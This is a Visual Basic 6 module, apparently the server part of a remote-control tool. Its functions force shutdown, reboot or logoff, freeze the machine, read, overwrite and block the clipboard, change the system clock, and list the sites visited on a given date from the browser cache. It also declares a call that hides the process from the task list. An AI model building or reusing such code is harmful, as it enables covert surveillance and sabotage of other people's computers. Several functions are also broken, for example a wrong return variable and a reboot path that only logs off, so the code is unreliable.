Attribute VB_Name = "WinControl"
'This Module Includes :
'Windows Control (shut down ,...)
'ClipBoard Control (Get clipboard ,...)
'Registry Managment
'Declerations
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function LookupPrivilegeValue Lib "advapi32" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LUID) As Long
Private Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function SetClipboardViewer Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function FileTimeToLocalFileTime Lib "kernel32" (lpFileTime As FILETIME, lpLocalFileTime As FILETIME) As Long
Private Declare Function FileTimeToSystemTime Lib "kernel32" (lpFileTime As FILETIME, lpSystemTime As SYSTEMTIME) As Long
Private Declare Function LocalFileTimeToFileTime Lib "kernel32" (lpLocalFileTime As FILETIME, lpFileTime As FILETIME) As Long
Private Declare Function SystemTimeToFileTime Lib "kernel32" (lpSystemTime As SYSTEMTIME, lpFileTime As FILETIME) As Long
Private Declare Function FindFirstUrlCacheEntry Lib "Wininet.dll" Alias "FindFirstUrlCacheEntryA" (ByVal lpszUrlSearchPattern As String, lpFirstCacheEntryInfo As Any, lpdwFirstCacheEntryInfoBufferSize As Long) As Long
Private Declare Function FindNextUrlCacheEntry Lib "Wininet.dll" Alias "FindNextUrlCacheEntryA" (ByVal hEnumHandle As Long, lpNextCacheEntryInfo As Any, lpdwNextCacheEntryInfoBufferSize As Long) As Long
Private Declare Function FindCloseUrlCache Lib "Wininet.dll" (ByVal hEnumHandle As Long) As Long
Private Declare Function DeleteUrlCacheEntry Lib "Wininet.dll" Alias "DeleteUrlCacheEntryA" (ByVal lpszUrlName As String) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDest As Any, pSource As Any, ByVal dwLength As Long)
Private Declare Function lstrcpyA Lib "kernel32" (ByVal retVal As String, ByVal ptr As Long) As Long
Private Declare Function lstrlenA Lib "kernel32" (ByVal ptr As Any) As Long
Private Declare Function LocalAlloc Lib "kernel32" (ByVal uFlags As Long, ByVal uBytes As Long) As Long
Private Declare Function LocalFree Lib "kernel32" (ByVal hMem As Long) As Long
'Constants
Private Const EWX_LOGOFF = 0
Private Const EWX_SHUTDOWN = 1
Private Const EWX_REBOOT = 2
Private Const EWX_FORCE = 4
Private Const TOKEN_ADJUST_PRIVILEGES = &H20
Private Const TOKEN_QUERY = &H8
Private Const SE_PRIVILEGE_ENABLED = &H2
Private Const ANYSIZE_ARRAY = 1
Private Const VER_PLATFORM_WIN32_NT = 2
Private Const WM_DRAWCLIPBOARD = &H308
Private Const GWL_WNDPROC = (-4)

'Types & Structures

Type LUID
    LowPart As Long
    HighPart As Long
End Type
Type LUID_AND_ATTRIBUTES
    pLuid As LUID
    Attributes As Long
End Type
Type TOKEN_PRIVILEGES
    PrivilegeCount As Long
    Privileges(ANYSIZE_ARRAY) As LUID_AND_ATTRIBUTES
End Type
Public Const ERROR_CACHE_FIND_FAIL As Long = 0
Public Const ERROR_INSUFFICIENT_BUFFER As Long = 122
Public Const LMEM_FIXED As Long = &H0
Public Const NORMAL_CACHE_ENTRY As Long = &H1
Public Const STICKY_CACHE_ENTRY As Long = &H40
Public Const COOKIE_CACHE_ENTRY As Long = &H100000
Public Const hist_CACHE_ENTRY As Long = &H200000
Private Type SYSTEMTIME
        wYear As Integer
        wMonth As Integer
        wDayOfWeek As Integer
        wDay As Integer
        wHour As Integer
        wMinute As Integer
        wSecond As Integer
        wMilliseconds As Integer
End Type
Private Type FILETIME
     dwLowDateTime As Long
     dwHighDateTime As Long
End Type
Private Type INTERNET_CACHE_ENTRY_INFO
     dwStructSize As Long
     lpszSourceUrlName As Long
     lpszLocalFileName As Long
     CacheEntryType As Long
     dwUseCount As Long
     dwHitRate As Long
     dwSizeLow As Long
     dwSizeHigh As Long
     LastModifiedTime As FILETIME
     ExpireTime As FILETIME
     LastAccessTime As FILETIME
     LastSyncTime As FILETIME
     lpHeaderInfo As Long
     dwHeaderInfoSize As Long
     lpszFileExtension As Long
     dwExemptDelta  As Long
End Type
Public Type InternetCacheEntry
     SourceUrlName As String
     LocalFileName As String
     UseCount As Long
     HitRate As Long
     Size As Long
     LastModifiedTime As Date
     ExpireTime As Date
     LastAccessTime As Date
     LastSyncTime As Date
     HeaderInfo As String
     FileExtension As String
End Type
'Variables
Private PrevProc As Long
Public Function ShutDownSystem(Force As Boolean) As String
    On Error GoTo Failed
    Dim Flags As Long
    Flags = EWX_SHUTDOWN
    If Force Then Flags = Flags + EWX_FORCE
    If IsWinNT Then
        If EnableShutDown = True Then
            If ExitWindowsEx(Flags, 0) <> 0 Then
                ShutDownNT = "T"
            End If
        End If
    Else
        If ExitWindowsEx(EWX_FORCE Or EWX_SHUTDOWN, 0) <> 0 Then
                ShutDownNT = "T"
        End If
    End If
    Exit Function
Failed:
    ShutDownNT = "F" & err.Description
End Function
Public Function RebootSystem(Force As Boolean) As String
    On Error GoTo Failed
    Dim Flags As Long
    Flags = EWX_REBOOT
    If Force Then Flags = Flags + EWX_FORCE
    If IsWinNT Then
        If EnableShutDown = True Then
            If ExitWindowsEx(Flags, 0) <> 0 Then
                RebootSystem = "T"
            End If
        End If
    Else
        If ExitWindowsEx(EWX_FORCE Or EWX_LOGOFF, 0) <> 0 Then
                RebootSystem = "T"
        End If
    End If
    Exit Function
Failed:
    RebootSystem = "F" & err.Description
End Function
'Log off the current user
Public Function LogOffSystem(Force As Boolean) As String
    Dim Ret As Long
    Dim Flags As Long
    Flags = EWX_LOGOFF
    If Force Then Flags = Flags + EWX_FORCE
    If IsWinNT Then
        If EnableShutDown = True Then
            If ExitWindowsEx(Flags, 0) <> 0 Then
                LogOffSystem = "T"
            End If
        End If
    Else
        If ExitWindowsEx(EWX_FORCE Or EWX_LOGOFF, 0) <> 0 Then
                LogOffSystem = "T"
        End If
    End If
    Exit Function
Failed:
    LogOffSystem = "F" & err.Description
End Function
Public Function HibernateSystem() As String
    'TODO
     HibernateSystem = "F"
End Function
Public Function HangSystem() As String
   'Calls The Task Manager Method Of Freezing The System
    Call TaskManager.FreezSystem
End Function
Public Function GetSystemTime() As String
    On Error GoTo Failed
    GetSystemTime = "T" & time
    Exit Function
Failed:
    GetSystemTime = "F"
End Function
Public Function SetSystemTime(NewTime As String) As String
   'Example [#5:10:14 PM#]
    On Error GoTo Failed
    time = NewTime
    SetSystemTime = "T" & time
    Exit Function
Failed:
    SetSystemTime = "F"
End Function
Public Function GetSystemDate() As String
    On Error GoTo Failed
    GetSystemDate = "T" & Date
    Exit Function
Failed:
    GetSystemDate = "F"
End Function
Public Function SetSystemDate(NewDate As String) As String
   'Example [#7/8/2004#]
    On Error GoTo Failed
    Date = NewDate
    SetSystemDate = "T" & Date
    Exit Function
Failed:
    SetSystemDate = "F"
End Function
Public Function GetClipBoardText() As String
    On Error GoTo Failed
    GetClipBoardText = "T" & Clipboard.GetText
    Exit Function
Failed:
    GetClipBoardText = "F"
End Function
Public Function SetClipBoardText(NewText As String) As String
    On Error GoTo Failed
    Clipboard.Clear
    Clipboard.SetText NewText
    SetClipBoardText = "T"
    Exit Function
Failed:
    SetClipBoardText = "F"
End Function
Public Function ClearClipBoard() As String
    On Error GoTo Failed
    Clipboard.Clear
    If Len(Clipboard.GetText) = 0 Then
        ClearClipBoard = "T"
    End If
    Exit Function
Failed:
    ClearClipBoard = "F"
End Function
Public Function DisableClipBoard() As String
    On Error GoTo Failed
   'Hook The ClipBoard Message to A Function WindowsProc
    If HookForm(SrvHwnd) = True Then
        SetClipboardViewer SrvHwnd
        DisableClipBoard = "T"
        Exit Function
    End If
Failed:
    DisableClipBoard = "F"
End Function
Public Function EnableClipBoard() As String
    On Error GoTo Failed
   'Hook The ClipBoard Message to A Function WindowsProc
    If UnHookForm(SrvHwnd) = True Then
        EnableClipBoard = "T"
        Exit Function
    End If
Failed:
    EnableClipBoard = "F"
End Function
Private Function EnableShutDown() As String
'Set the shut down privilege for the current application
 On Error GoTo Failed
    Dim hProc As Long
    Dim hToken As Long
    Dim mLUID As LUID
    Dim mPriv As TOKEN_PRIVILEGES
    Dim mNewPriv As TOKEN_PRIVILEGES
    hProc = GetCurrentProcess()
    OpenProcessToken hProc, TOKEN_ADJUST_PRIVILEGES + TOKEN_QUERY, hToken
    LookupPrivilegeValue "", "SeShutdownPrivilege", mLUID
    mPriv.PrivilegeCount = 1
    mPriv.Privileges(0).Attributes = SE_PRIVILEGE_ENABLED
    mPriv.Privileges(0).pLuid = mLUID
   'Enable shutdown privilege for the current application
    AdjustTokenPrivileges hToken, False, mPriv, 4 + (12 * mPriv.PrivilegeCount), mNewPriv, 4 + (12 * mNewPriv.PrivilegeCount)
    EnableShutDown = True
    Exit Function
Failed:
    EnableShutDown = False
End Function
Private Function IsWinNT() As Boolean
    If OSversion = WINNT_XP_SERVER Then
        IsWinNT = True
    End If
End Function
Private Function HookForm(FHwnd As Long) As Boolean
    On Error GoTo Failed
    PrevProc = SetWindowLong(FHwnd, GWL_WNDPROC, AddressOf WindowProc)
    HookForm = True
    Exit Function
Failed:
    HookForm = False
End Function
Private Function UnHookForm(FHwnd As Long) As Boolean
    On Error GoTo Failed
    SetWindowLong FHwnd, GWL_WNDPROC, PrevProc
    UnHookForm = True
    Exit Function
Failed:
    UnHookForm = False
End Function
Private Function WindowProc(ByVal hwnd As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    WindowProc = CallWindowProc(PrevProc, hwnd, uMsg, wParam, lParam)
    If uMsg = WM_DRAWCLIPBOARD Then
        Clipboard.Clear
    End If
End Function
Public Function GetCache(TheDate As Date) As String
Dim hFile As Long, BuffSize As Long, CachePtr As Long
Dim Hists As String
Dim IntCacheEntInf As INTERNET_CACHE_ENTRY_INFO
Dim Hist() As InternetCacheEntry
hFile = FindFirstUrlCacheEntry(0&, ByVal 0, BuffSize) 'buffsize now holds the size of the cach buffer
If (hFile = ERROR_CACHE_FIND_FAIL) And (err.LastDllError = ERROR_INSUFFICIENT_BUFFER) Then
    CachePtr = LocalAlloc(LMEM_FIXED, BuffSize)
    If CachePtr Then
        ReDim Hist(0)
        CopyMemory ByVal CachePtr, BuffSize, 4
        hFile = FindFirstUrlCacheEntry(vbNullString, ByVal CachePtr, BuffSize)
        If hFile <> ERROR_CACHE_FIND_FAIL Then
            Do
                CopyMemory IntCacheEntInf, ByVal CachePtr, Len(IntCacheEntInf)
                If IntCacheEntInf.CacheEntryType And NORMAL_CACHE_ENTRY Then
                       'Case  (hist_CACHE_ENTRY + NORMAL_CACHE_ENTRY)
                            ReDim Preserve Hist(UBound(Hist) + 1)
                            Hist(UBound(Hist) - 1).SourceUrlName = GetStrFromPtrA(IntCacheEntInf.lpszSourceUrlName)
                            Hist(UBound(Hist) - 1).LocalFileName = GetStrFromPtrA(IntCacheEntInf.lpszLocalFileName)
                            Hist(UBound(Hist) - 1).FileExtension = GetStrFromPtrA(IntCacheEntInf.lpszFileExtension)
                            Hist(UBound(Hist) - 1).HeaderInfo = GetStrFromPtrA(IntCacheEntInf.lpHeaderInfo)
                            Hist(UBound(Hist) - 1).HitRate = IntCacheEntInf.dwHitRate
                            Hist(UBound(Hist) - 1).ExpireTime = FileTime2SysTime(IntCacheEntInf.ExpireTime)
                            Hist(UBound(Hist) - 1).LastAccessTime = FileTime2SysTime(IntCacheEntInf.LastAccessTime)
                            Hist(UBound(Hist) - 1).LastModifiedTime = FileTime2SysTime(IntCacheEntInf.LastModifiedTime)
                            Hist(UBound(Hist) - 1).LastSyncTime = FileTime2SysTime(IntCacheEntInf.LastSyncTime)
                            Hist(UBound(Hist) - 1).Size = IntCacheEntInf.dwSizeHigh * 2 ^ 32 + IntCacheEntInf.dwSizeLow
                            Hist(UBound(Hist) - 1).UseCount = IntCacheEntInf.dwUseCount
                            Dim WebName As String
                            WebName = Hist(UBound(Hist) - 1).SourceUrlName
                            WebName = Mid$(WebName, 1, InStr(8, WebName, "/"))
                            If DateValue(Hist(UBound(Hist) - 1).LastAccessTime) = TheDate Then
                                If InStr(1, Hists, WebName) = 0 Then
                                    Hists = Hists & WebName & vbCrLf  'Add The Web Site Name
                                End If
                            End If
                End If
                LocalFree (CachePtr)
                BuffSize = 0
                FindNextUrlCacheEntry hFile, ByVal 0, BuffSize
                CachePtr = LocalAlloc(LMEM_FIXED, BuffSize)
                CopyMemory ByVal CachePtr, BuffSize, 4
            Loop While FindNextUrlCacheEntry(hFile, ByVal CachePtr, BuffSize)
        End If
    End If
End If
LocalFree (CachePtr)
FindCloseUrlCache (hFile)
GetCache = Hists
End Function
Private Function GetStrFromPtrA(ByVal lpszA As Long) As String
     GetStrFromPtrA = String$(lstrlenA(ByVal lpszA), 0)
     Call lstrcpyA(ByVal GetStrFromPtrA, ByVal lpszA)
End Function
Private Function FileTime2SysTime(FileT As FILETIME) As Date
Dim SysT As SYSTEMTIME
FileTimeToLocalFileTime FileT, FileT
FileTimeToSystemTime FileT, SysT
FileTime2SysTime = TimeSerial(SysT.wHour, SysT.wMinute, SysT.wSecond) + DateSerial(SysT.wYear, SysT.wMonth, SysT.wDay)
End Function
